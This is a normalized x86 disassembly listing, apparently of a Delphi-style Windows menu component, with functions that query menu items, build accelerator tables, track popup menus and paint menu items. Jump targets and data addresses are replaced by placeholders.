mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_45345c
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_4534f0
mov eax ebx
call sub_453a24
jmp r-xdata
sub_4535d4
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_45361c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_44d84c
mov eax ebx
call sub_452e30
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_44d890
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_41d168
sub_453658
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41d3b4
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_45361c
sub_45369c
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_452ee0
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_452ee0
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_456b94
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_4536f8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_4537cd
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_452ee0
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_452ee0
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_451a8c
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_451a9c
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_404220
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_404220
mov eax [ ebp - 0xc ]
pop edx
call sub_408064
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_454748
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4537d4
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_40405c
retn
sub_4537e0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_45369c
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_4536f8
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_453958
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_453064
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_452ee0
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_452ee0
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_40890c
mov eax [ ebp + 0x10 ]
call sub_408824
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_453a24
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_43cb90
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_453a00
mov [ ebx + 0x41 ] 0x1
sub_453a4c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403498
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_453a00
mov [ ebx + 0x41 ] 0x1
sub_453ad8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4535d4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_45345c
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_453b68
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_453ba4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi eax
mov dx [ esi + 0x60 ]
test dx dx
je r-xdata
mov eax esi
call sub_451a8c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
jmp r-xdata
mov al 0x3
test dh 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax esi
call sub_451a9c
call sub_453ba4
pop ecx
inc edi
dec ebx
jne r-xdata
test dh 0x80
je r-xdata
or al 0x8
test dh 0x20
je r-xdata
or al 0x10
and eax 0xff
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx ] ax
mov ax [ esi + 0x60 ]
and ax 0xff
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x2 ] ax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dx [ esi + 0x50 ]
mov [ eax + 0x4 ] dx
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x6
jmp r-xdata
or al 0x4
sub_453c44
push ebp
mov ebp esp
push ebx
push esi
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x8 ]
test ecx ecx
jl r-xdata
xor eax eax
pop esi
pop ebx
pop ebp
retn
inc ecx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc ]
add edx 0x4
dec ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_453ba4
pop ecx
jmp r-xdata
xor ebx ebx
mov bl [ eax + 0x3f ]
cmp ebx [ edx ]
jne r-xdata
sub_453c7c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x34 ]
mov edx [ eax + 0x68 ]
mov ecx sub_453c44
xchg ecx eax
call sub_44f54c
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
add eax eax
lea eax [ eax + eax * 2 ]
call sub_40276c
mov esi eax
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x34 ]
mov edx [ eax + 0x68 ]
mov ecx sub_453c44
xchg ecx eax
call sub_44f54c
mov eax [ ebp - 0x8 ]
push eax
push esi
call CreateAcceleratorTableA
mov edx [ ebp - 0xc ]
mov [ edx ] eax
mov eax esi
call sub_40278c
sub_453d00
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
test esi esi
jl r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc ]
inc [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov cl [ eax - 0xd ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax edi
call sub_44fb10
xor eax eax
mov al [ edi + 0x3f ]
cmp eax [ ebx ]
jne r-xdata
sub_453d4c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] edx
mov ebx eax
mov eax ebx
call sub_453684
mov [ ebp - 0xd ] al
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov eax [ ebx + 0x34 ]
mov ecx eax
mov edx [ eax + 0x68 ]
mov eax sub_453d00
call sub_44f54c
pop ebx
mov esp ebp
pop ebp
retn 0xc
inc edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov [ eax ] ecx
add eax 0x4
dec edx
jne r-xdata
sub_453da8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_453dd2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_453df4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_454327
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45432e
lea eax [ ebp - 0x30 ]
call sub_404038
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417570
mov edx [ esi + 0x4 ]
call sub_452f9c
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_4601a4
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417570
mov dx [ esi + 0x4 ]
call sub_452f80
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_420d88
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_45415a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_45413d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_4214ec
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_42138c
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4545cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454144
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_4214ec
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_4537e0
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_452ee0
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417570
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_452ee0
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_45429d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_420d88
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_454278
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_45425b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_4214ec
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_42138c
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454262
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_4214ec
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_43ce14
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4601a4
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417570
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_452ee0
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417570
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_452ee0
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417570
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417570
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_452ee0
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417570
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417570
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_452f10
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417570
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_417570
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_452f10
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_45fe48
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_45feb0
jmp r-xdata
sub_45427f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_454338
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_417414
pop esi
pop ebx
retn
push ebx
push sub_453da8
call sub_41e1e4
mov [ ebx + 0x10 ] eax
sub_45437c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_452cf8
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_454338
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_4543f0
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_454360
mov edx ebx
and dl 0xfc
mov eax esi
call sub_452d94
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_454448
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_44f090
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_453a00
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_453a00
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_454490
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_44f090
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45e9f4
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_4034e4
mov edx eax
jmp r-xdata
sub_4544dc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_416114
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_454448
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_45264c
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_452b48
mov eax [ ebx + 0x34 ]
call sub_44fef0
mov eax ebx
call sub_4534f0
mov eax ebx
call sub_454490
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_450020
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_454590
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_417570
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_417570
cmp ebp [ eax ]
jne r-xdata
sub_4545cc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_420c38
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_42046c
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_420c38
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_42046c
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_4034e4
mov edx [ r-xdata ]
call sub_403474
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_420c38
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_42046c
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_4546b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_40408c
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_4042f8
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
